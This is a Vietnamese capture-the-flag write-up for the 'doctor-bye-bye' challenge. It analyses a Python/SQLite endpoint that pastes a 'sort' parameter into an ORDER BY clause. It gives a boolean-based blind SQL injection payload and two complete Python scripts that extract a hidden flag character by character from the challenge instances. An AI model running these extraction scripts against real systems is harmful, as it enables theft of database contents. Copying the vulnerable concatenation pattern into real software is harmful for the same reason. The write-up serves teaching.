# Phân Tích
Nhìn tổng thể thì đây là bài SQL injection. Challenge có CSDL như bên dưới. Điều đáng chú ý là `FLAG` nằm ở cột `farewell_note` của bảng `doctors`
```sql
def initialize_database(flag):
    DATABASE.unlink(missing_ok=True)
    connection = sqlite3.connect(DATABASE)
    try:
        connection.executescript(
            """
            CREATE TABLE doctors (
                id INTEGER PRIMARY KEY,
                slug TEXT NOT NULL UNIQUE,
                name TEXT NOT NULL,
                specialty TEXT NOT NULL,
                room TEXT NOT NULL,
                listed INTEGER NOT NULL CHECK (listed IN (0, 1)),
                farewell_note TEXT
            );

            INSERT INTO doctors VALUES
                (10, 'ada-pulse', 'Dr. Ada Pulse', 'Cardiology', 'C-101', 1, NULL),
                (30, 'max-well', 'Dr. Max Well', 'Radiology', 'R-204', 1, NULL),
                (50, 'paige-turner', 'Dr. Paige Turner', 'Neurology', 'N-303', 1, NULL),
                (70, 'ella-ment', 'Dr. Ella Ment', 'Pathology', 'P-118', 1, NULL),
                (90, 'zoe-last', 'Dr. Zoe Last', 'Emergency medicine', 'E-001', 1, NULL);
            """,
        )
        connection.execute(
            "INSERT INTO doctors VALUES (?, ?, ?, ?, ?, ?, ?)",
            (404, "doctor-bye-bye", "Dr. Bye Bye", "Retired", "-", 0, flag),
        )
        connection.commit()
    finally:
        connection.close()
```

Mình thấy api  `/api/on-call` thực hiện lấy giá trị tham số `sort` đưa vào biến `order_expression` rồi truyền vào hàm `select_on_call`. Ở hàm đó, giá trị `order_expression` sẽ được nối thẳng với `query` và thực hiện execute. Kết quả trả về sẽ là các bản ghi của cột 1,2,3 tương ứng name, specialthy, room. Trong hàm này có thực hiện việc giới hạn độ dài của câu lệnh SQL và kích thước tối đa của một giá trị trong SQLite.Ngoài ra còn ngăn chặn 
```python
...
 if request.path == "/api/on-call":
            parameters = parse_qs(request.query, keep_blank_values=True)
            order_expression = parameters.get("sort", ["name"])[0]
            if not order_expression or len(order_expression) > 600:
                self.send_json(400, {"error": "Invalid schedule preference."})
                return
            try:
                doctor = select_on_call(order_expression)
            except (sqlite3.Error, LookupError):
                # Query errors deliberately do not expose database details.
                self.send_json(400, {"error": "The on-call board could not be updated."})
                return
            self.send_json(200, {"doctor": doctor})
            return
...
def select_on_call(order_expression):
    query = f"""
        SELECT name, specialty, room
        FROM doctors
        WHERE listed = 1
        ORDER BY {order_expression}
        LIMIT 1
    """
    connection = sqlite3.connect(DATABASE)
    try:
        connection.setlimit(sqlite3.SQLITE_LIMIT_LENGTH, SQLITE_VALUE_LIMIT)
        connection.setlimit(sqlite3.SQLITE_LIMIT_SQL_LENGTH, SQLITE_SQL_LIMIT)
        operations_left = SQLITE_VM_BUDGET

        def enforce_budget():
            nonlocal operations_left
            operations_left -= 1_000
            return operations_left <= 0

        connection.set_progress_handler(enforce_budget, 1_000)
        row = connection.execute(query).fetchone()
    finally:
        connection.close()
    if row is None:
        raise LookupError("no on-call doctor")
    return {"name": row[0], "specialty": row[1], "room": row[2]}
```
Trong bài, author đã đưa ra flag không quá 128 kí tự và đều các các kí tự ASCII nằm trong khoảng (32,126).
```python
def validate_flag(flag):
    if not (flag.startswith("FortID{") and flag.endswith("}")):
        raise SystemExit("FLAG must use the FortID{...} format")
    if len(flag) > 128:
        raise SystemExit("FLAG must be at most 128 characters")
    if any(ord(character) < 32 or ord(character) > 126 for character in flag):
        raise SystemExit("FLAG must contain printable ASCII characters only"
```
# Khai thác
Dựa việc phân tích trên, cách khai thác tìm flag của bài này sẽ là thực hiện SQL injection Boolean-based. Cụ thể, mình sẽ đưa vào 1 biểu thức trả về giá trị `id` và `-id`. Mục tiêu là nếu `yes` name `Dr. Ada Pulse` được hiển thị. Ngược lại thì `Dr. Zoe Last` được hiển thị

Payload sẽ là `(CASE WHEN substr((select farewell_note from doctors where id=404),1,1)='F' THEN id ELSE -id END)` lần lượt thì sẽ ra được flag. Nếu muốn nhanh hơn thì mình sẽ chuyển đổi kí tự flag sang unicode rồi đem so sánh với middle(32,127) để thu hẹp khoảng cách brute force nhanh hơn. Script toàn bộ ở bên dưới:
```python
# Script 1
import requests

URL = "https://doctor-bye-bye-d715122c9c40.inst8.ctf.fortid.com/api/on-call"

def check(pos, value):
    payload = (
        "CASE WHEN unicode(substr("
        "(SELECT farewell_note FROM doctors WHERE id=404),"
        f"{pos},1))>{value} THEN id ELSE -id END"
    )
    response = requests.get(URL, params={"sort": payload}).json()
    return response["doctor"]["name"] == "Dr. Ada Pulse"

flag = ""
for pos in range(1, 129):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        if check(pos, mid):
            low = mid + 1
        else:
            high = mid

    flag += chr(low)
    print(flag)
    if flag.endswith("}"):
        break
```

```python
# Script 2
import requests


# Doi URL nay neu ban chay challenge o may local.
URL = "https://doctor-bye-bye-edb6c165b3b8.inst8.ctf.fortid.com/api/on-call"


def check(position, character):
    safe_character = character.replace("'", "''")
    payload = (
        "CASE WHEN substr("
        "(SELECT farewell_note FROM doctors WHERE id=404),"
        f"{position},1)='{safe_character}' THEN id ELSE -id END"
    )

    response = requests.get(URL, params={"sort": payload}, timeout=10)
    response.raise_for_status()
    doctor_name = response.json()["doctor"]["name"]
    return doctor_name == "Dr. Ada Pulse"


flag = "FortID{"
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-{}"

for position in range(8, 129):
    for character in charset:

        if check(position, character):
            flag += character
            print(flag)
            break

    if flag.endswith("}"):
        break
```
# Kết luận 
|TOP 10 OWSAP|CWE|Location in source|
|---|---|---|
|A05:2025 Injection|CWE-89 Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')|`select_on_call()`